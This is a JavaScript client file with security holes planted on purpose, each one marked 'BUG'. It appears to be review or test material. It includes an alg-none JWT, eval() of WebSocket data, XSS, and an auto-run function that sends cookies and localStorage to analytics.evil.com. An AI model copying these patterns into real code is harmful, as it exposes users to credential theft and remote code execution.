// BUG: No strict mode, global scope pollution

// BUG: Hardcoded API config
API_BASE = 'http://myapp.com/api'  // BUG: HTTP, not HTTPS
JWT_TOKEN = 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXJhZG1pbiIsImlhdCI6MTcwMDAwMDAwMH0.'
// BUG: JWT with "alg":"none" - no signature verification

// ============================================================
// BUG: JWT "verification" that verifies nothing
// ============================================================
function decodeJwt(token) {
    // BUG: Just decodes the payload, doesn't verify signature
    parts = token.split('.')  // BUG: Global variable
    if (parts.length < 2) return null

    // BUG: No signature verification at all
    payload = JSON.parse(atob(parts[1]))  // BUG: Global variable, no try/catch
    console.log('JWT Payload:', JSON.stringify(payload))  // BUG: Logging token contents

    // BUG: Client-side role check that can be bypassed
    if (payload.role === 'superadmin') {
        isAdmin = true  // BUG: Global variable controls admin access
    }

    return payload
}

// BUG: "Verify" token by just checking if it has 3 parts
function verifyJwt(token) {
    // BUG: This is NOT verification - just format checking
    return token.split('.').length === 3  // BUG: Any string with 2 dots passes
}

// ============================================================
// BUG: API client that sends credentials everywhere
// ============================================================
function apiGet(endpoint) {
    return fetch(API_BASE + endpoint, {
        method: 'GET',
        credentials: 'include',  // BUG: Sends cookies to API
        headers: {
            'Authorization': 'Bearer ' + JWT_TOKEN,  // BUG: Hardcoded token
            'X-API-KEY': API_KEY,  // BUG: From global in app.js
            'X-Admin-Password': ADMIN_PASSWORD,  // BUG: Sending password as header
        }
    })
    .then(response => {
        // BUG: No status code check
        return response.json()  // BUG: Assumes always JSON, no try/catch
    })
    // BUG: No .catch()
}

function apiPost(endpoint, data) {
    return fetch(API_BASE + endpoint, {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Authorization': 'Bearer ' + JWT_TOKEN,
            'Content-Type': 'application/json',
            'X-API-KEY': API_KEY,
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    // BUG: No error handling, no status check, no .catch()
}

// ============================================================
// BUG: User data fetching with no privacy
// ============================================================
function getAllUsers() {
    // BUG: Fetches ALL user data including passwords and credit cards
    return apiGet('/admin/dashboard')
        .then(data => {
            // BUG: Storing all user data in global variable
            window.allUsersData = data.users
            // BUG: Logging sensitive user data
            console.log('All users loaded:', JSON.stringify(data.users))
            // BUG: Storing in localStorage
            localStorage.setItem('cached_users', JSON.stringify(data.users))
            return data.users
        })
}

// ============================================================
// BUG: "Encryption" that isn't
// ============================================================
function encryptForTransmission(data) {
    // BUG: ROT13 is not encryption
    return data.replace(/[a-zA-Z]/g, function(char) {
        return String.fromCharCode(
            char.charCodeAt(0) + (char.toLowerCase() < 'n' ? 13 : -13)
        )
    })
}

function decryptFromTransmission(data) {
    // BUG: ROT13 is its own inverse - "decrypt" is same as "encrypt"
    return encryptForTransmission(data)
}

// BUG: Sending "encrypted" password
function secureLogin(username, password) {
    // BUG: ROT13 "encryption" on password before sending
    encryptedPassword = encryptForTransmission(password)  // BUG: Global
    console.log('Sending encrypted password:', encryptedPassword)  // BUG: Logging

    return apiPost('/user/admin-login', {
        username: username,
        password: encryptedPassword,  // BUG: Server won't understand ROT13 password
        plainPassword: password,  // BUG: Also sends plain password!
    })
    .then(response => {
        // BUG: Storing token and credentials in multiple insecure locations
        localStorage.setItem('auth_token', response.token)
        localStorage.setItem('username', username)
        localStorage.setItem('password', password)  // BUG: Plain password in localStorage
        sessionStorage.setItem('auth_token', response.token)
        document.cookie = 'auth=' + response.token + '; path=/'  // BUG: No Secure/HttpOnly

        // BUG: Setting global variables
        window.currentUser = username
        window.currentToken = response.token
        window.isAuthenticated = true
        window.isAdmin = true  // BUG: Always set to true

        return response
    })
}

// ============================================================
// BUG: File upload with no validation
// ============================================================
function uploadFile(fileInput) {
    file = fileInput.files[0]  // BUG: Global variable
    // BUG: No file type check
    // BUG: No file size check
    // BUG: No virus scan

    formData = new FormData()  // BUG: Global
    formData.append('document', file)

    // BUG: Sending credentials with file upload
    return fetch('/file/upload', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'X-API-KEY': API_KEY,
            'Authorization': 'Bearer ' + JWT_TOKEN,
            // BUG: NOT setting Content-Type (lets browser set multipart boundary)
            // ... but also sending auth headers unnecessarily
        },
        body: formData
    })
    .then(r => r.json())
    .then(data => {
        // BUG: Displaying server response without sanitization
        document.getElementById('upload-status').innerHTML =
            'File uploaded: <a href="/file/download?file=' + data.filename + '">' + data.filename + '</a>'
        // BUG: XSS via filename in innerHTML
    })
}

// ============================================================
// BUG: Websocket with no security
// ============================================================
function connectWebSocket() {
    // BUG: ws:// instead of wss:// (no TLS)
    ws = new WebSocket('ws://myapp.com/realtime')  // BUG: Global, no TLS

    ws.onopen = function() {
        // BUG: Sending credentials over unencrypted WebSocket
        ws.send(JSON.stringify({
            type: 'auth',
            token: JWT_TOKEN,
            apiKey: API_KEY,
            username: ADMIN_USER,
            password: ADMIN_PASS
        }))
        console.log('WebSocket connected, credentials sent')  // BUG: Logging
    }

    ws.onmessage = function(event) {
        data = JSON.parse(event.data)  // BUG: Global, no try/catch

        // BUG: Executing commands received via WebSocket
        if (data.type === 'execute') {
            eval(data.code)  // BUG: RCE via WebSocket
        }

        // BUG: Rendering received HTML without sanitization
        if (data.type === 'notification') {
            document.getElementById('notifications').innerHTML += data.html  // BUG: XSS
        }
    }

    ws.onerror = function(error) {
        // BUG: Exposing error details
        console.error('WebSocket error:', error)
        alert('Connection error: ' + JSON.stringify(error))  // BUG: alert
    }

    // BUG: No reconnection logic, connection just dies
}

// ============================================================
// BUG: Analytics that leaks everything
// ============================================================
function trackPageView() {
    // BUG: Sending tons of private data to a tracking pixel
    trackingData = {  // BUG: Global
        url: window.location.href,
        referrer: document.referrer,
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        screenResolution: screen.width + 'x' + screen.height,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        plugins: Array.from(navigator.plugins).map(p => p.name).join(','),
        timestamp: Date.now()
    }

    // BUG: Sending via GET parameter (appears in server logs, browser history)
    new Image().src = 'http://analytics.evil.com/pixel.gif?data=' +
        encodeURIComponent(JSON.stringify(trackingData))

    // BUG: Also via beacon
    navigator.sendBeacon('http://analytics.evil.com/collect', JSON.stringify(trackingData))
}

// ============================================================
// BUG: Auto-initialize everything
// ============================================================
decodeJwt(JWT_TOKEN)
connectWebSocket()
trackPageView()
getAllUsers()
console.log('API Client initialized with key:', API_KEY)
console.log('Admin credentials:', ADMIN_USER, ADMIN_PASS)
